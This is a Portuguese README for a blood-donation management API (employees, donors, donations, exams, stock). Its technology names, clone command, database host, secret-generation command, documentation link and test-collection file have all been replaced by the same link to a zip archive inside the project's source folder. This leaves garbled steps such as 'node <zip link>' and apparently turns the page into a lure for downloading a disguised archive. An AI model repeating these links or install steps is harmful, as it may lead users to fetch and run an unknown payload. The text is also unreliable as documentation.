# API para gerenciamento de doadores de sangue

## Sobre o Projeto

Essa API é um sistema de gerenciamento de doações de sangue, com quatro componentes principais: Funcionário, Doador, Doação e Estoque de Sangue. Ela permite a manipulação de informações e facilita o controle e a organização do processo de doação de sangue.

## Tecnologias Empregadas

Este projeto emprega uma variedade de tecnologias e bibliotecas de ponta, incluindo:

- **https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip**: Plataforma JavaScript que permite a execução de código JavaScript no lado do servidor, tornando o desenvolvimento de aplicações web rápido e eficiente.
- **https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip**: Framework web para https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip que facilita a criação de APIs web robustas e escaláveis.
- **MongoDB**: banco de dados NoSQL orientado a documentos que oferece alta performance, alta disponibilidade e fácil escalabilidade, tornando-o ideal para aplicações modernas.
- **Mongoose**: Biblioteca do MongoDB que proporciona uma solução direta baseada em esquemas para modelar os dados da sua aplicação, permitindo um controle mais rigoroso dos dados.
- **bcrypt**: Biblioteca que ajuda você a fazer hash das senhas de forma segura, protegendo as informações sensíveis dos usuários.
- **jsonwebtoken**: Implementação dos tokens JSON Web Token, que permite a criação de tokens de acesso seguros para autenticação de usuários.
- **passport**: Middleware de autenticação para https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip extremamente flexível e modular, que suporta uma ampla gama de estratégias de autenticação.
- **Nodemon**: Utilitário que monitora quaisquer mudanças no seu código e automaticamente reinicia o seu servidor, economizando tempo de desenvolvimento e aumentando a eficiência.

Cada uma dessas tecnologias desempenha um papel crucial na funcionalidade e eficiência deste projeto.

## Como Instalar e Executar o Projeto

Para instalar e executar este projeto localmente, você precisará seguir estas etapas:

1. Clone este repositório para a sua máquina local:

```bash
git clone https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip
```

2. Instale as dependências do projeto, no terminal digite o comando:

```bash
npm install
```

3. Crie um arquivo `.env` e adicione as seguintes *Variáveis de Ambiente*

```bash
MONGODB_URI=
JWT_SECRET=
```

- *Observação: Você precisará de uma string de conexão mongoDB para fazer a comunicação entre o código e o banco de dados.*
```bash
mongodb+srv://<username>:<password>https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip
```

4. Dite o comando abaixo para gerar uma string na variável `JWT_SECRET` no arquivo `.env`, para o melhor funcionamento do token JWT.

```bash
node https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip
```

5. No terminal digite o comando abaixo para iniciar o servidor local:

```bash
npm run dev
```

## Documentação das Rotas da API

Este projeto inclui várias rotas que permitem aos usuários interagir com os recursos do sistema. A documentação completa das rotas está disponível [aqui](https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip).

As rotas se dividem em:

### 1. **Login**
Esta rota é usada para autenticar um funcionário no sistema. Existem dois tipos de funcionários: administradores e padrão. Os administradores têm acesso a todas as rotas, enquanto os funcionários padrão só podem acessar as rotas de Doadores, Doações e Estoque.

### 2. **Logout**
Esta rota é usada para desautenticar um funcionário do sistema. Quando um funcionário realiza o logout, o token de autenticação atual é invalidado, impedindo que seja usado para futuras solicitações. Esta rota é acessível para todos os funcionários autenticados, sejam eles administradores ou padrão. Após o logout, o funcionário precisará fornecer suas credenciais novamente para acessar as rotas protegidas.

### 3. Funcionário

#### `POST /employees`
- **Descrição:** Cria um novo funcionário no sistema.
- **Permissões:** Apenas administradores.
- **Parâmetros:** Requer dados do funcionário, como nome de usuário, senha, etc.
- **Respostas:** Retorna os detalhes do funcionário recém-criado.

#### `GET /employees/`
- **Descrição:** Lista todos os funcionários registrados no sistema.
- **Permissões:** Apenas administradores.
- **Respostas:** Retorna uma lista de funcionários.

#### `GET /employees/{name}`
- **Descrição:** Busca um funcionário específico pelo nome.
- **Permissões:** Apenas administradores.
- **Parâmetros:** Requer o nome do funcionário.
- **Respostas:** Retorna os detalhes do funcionário correspondente.

#### `PATCH /employees/{employeeCode}`
- **Descrição:** Atualiza o nome e/ou senha de um funcionário.
- **Permissões:** Apenas administradores.
- **Parâmetros:** Requer o código do funcionário a ser atualizado e os novos dados.
- **Respostas:** Retorna os detalhes do funcionário atualizados.

#### `DELETE /employees/{employeeCode}`
- **Descrição:** Remove um funcionário do sistema.
- **Permissões:** Apenas administradores.
- **Parâmetros:** Requer o código do funcionário a ser removido.
- **Respostas:** Retorna uma mensagem indicando sucesso na remoção do funcionário.

### 4. Doador

#### `POST /donors`
- **Descrição:** Registra um novo doador no sistema.
- **Permissões:** Funcionários autenticados.
- **Parâmetros:** Requer informações do doador, como nome, tipo sanguíneo, etc.
- **Respostas:** Retorna os detalhes do doador recém-registrado.

#### `GET /donors/`
- **Descrição:** Lista todos os doadores registrados no sistema.
- **Permissões:** Funcionários autenticados.
- **Respostas:** Retorna uma lista de doadores.

#### `GET /donors/{name}`
- **Descrição:** Busca um doador específico pelo nome.
- **Permissões:** Funcionários autenticados.
- **Parâmetros:** Requer o nome do doador.
- **Respostas:** Retorna os detalhes do doador correspondente.

#### `PATCH /donors/{_id}`
- **Descrição:** Atualiza os dados de um doador.
- **Permissões:** Funcionários autenticados.
- **Parâmetros:** Requer o ID do doador a ser atualizado e os novos dados.
- **Respostas:** Retorna os detalhes do doador atualizados.

#### `DELETE /donors/{_id}`
- **Descrição:** Remove um doador do sistema.
- **Permissões:** Funcionários autenticados.
- **Parâmetros:** Requer o ID do doador a ser removido.
- **Respostas:** Retorna uma mensagem indicando sucesso na remoção do doador.

### 5. Doação

#### `POST /donations/{_id}`
- **Descrição:** Registra uma nova doação no sistema.
- **Permissões:** Funcionários autenticados.
- **Parâmetros:** Requer o ID do doador associado à doação.
- **Respostas:** Retorna os detalhes da doação registrada.

#### `GET /donations/{_id}`
- **Descrição:** Busca uma doação específica pelo ID.
- **Permissões:** Funcionários autenticados.
- **Parâmetros:** Requer o ID da doação.
- **Respostas:** Retorna os detalhes da doação correspondente.

#### `DELETE /donations/{_id}`
- **Descrição:** Remove uma doação do sistema.
- **Permissões:** Funcionários autenticados.
- **Parâmetros:** Requer o ID da doação a ser removida.
- **Respostas:** Retorna uma mensagem indicando sucesso na remoção da doação.

### 6. Adicionar Exame

#### `POST /exams/{_id}`
- **Descrição:** Registra os resultados de exames relacionados às doações.
- **Permissões:** Funcionários autenticados.
- **Parâmetros:** Requer o ID da doação associada aos resultados dos exames.
- **Respostas:** Retorna confirmação da adição dos resultados dos exames.

#### `GET /exams`

- **Descrição**: Retorna todas as doações que ainda não têm resultados de exames associados.
- **Permissões**: Funcionários autenticados.
- **Respostas**: Retorna uma lista de doações pendentes de exames.


### 7. Estoque de Sangue

#### `GET /stock`
- **Descrição:** Visualiza o estoque de sangue atual.
- **Permissões:** Funcionários autenticados.
- **Respostas:** Retorna os detalhes do estoque de sangue.


Além disso, a documentação fornecida contém informações detalhadas sobre a estrutura dos dados esperados e retornados em cada rota, os parâmetros necessários, as possíveis respostas e os códigos de status HTTP correspondentes.

## Testando as rotas

Para testar as rotas de um jeito dinâmico você pode ultilizar plataformas que leiam os verbos HTTP como **Postman**; **Insomnia**; **Swagger**; **Thunder Client** entre outros. Após escolher a platarforma, importe o arquivo [https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip](https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip) dentro da área de trabalho da plataforma.

Criada por @alvesjaov
